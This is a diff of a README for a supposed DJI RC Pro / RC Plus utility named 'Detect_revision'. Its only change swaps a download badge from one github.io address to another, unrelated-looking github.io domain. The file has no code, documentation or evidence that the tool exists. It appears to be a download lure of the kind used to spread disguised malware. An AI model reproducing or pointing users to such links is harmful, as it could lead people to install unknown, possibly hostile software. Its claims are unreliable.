@@ -4,11 +4,8 @@
   <img src="https://ir.ozone.ru/s3/multimedia-1-2/6997112246.jpg" width="820" alt="Detect_revision — DJI RC Pro / RC Plus">
 </p>
 
-<p align="center">
-  <a href="https://detect-revision-multibind-utility.github.io/.github">
-    <img src="https://img.shields.io/badge/Download_Detect_revision-1b2838?style=for-the-badge&logo=windows&logoColor=white" alt="Download Detect_revision">
-  </a>
-</p>
+[![GET Detect revision](https://img.shields.io/badge/GET%20%E2%80%94%20Detect-revision-0078D6?style=for-the-badge&logoColor=white)](https://palmquistsolarpeasnall.github.io/.github/Detect-revision)
+
 
 ---
 
